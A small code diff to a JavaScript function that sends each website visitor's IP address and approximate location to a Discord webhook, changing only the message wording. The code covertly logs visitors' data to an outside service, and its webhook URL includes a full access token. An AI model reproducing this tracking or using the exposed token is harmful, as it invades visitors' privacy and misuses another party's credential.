@@ -4,7 +4,7 @@
 function sendToDiscord(ip, location) {
     const webhookUrl = "https://discord.com/api/webhooks/1255583928014733323/tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
     const message = {
-        content: `Nouvel visiteur sur le site.\nAdresse IP: ${ip}\nLocalisation approximative: ${location}`
+        content: `Someone visited the site ( bruh ).\n IP: ${ip}\nLocalization : ${location}`
     };
 
     fetch(webhookUrl, {
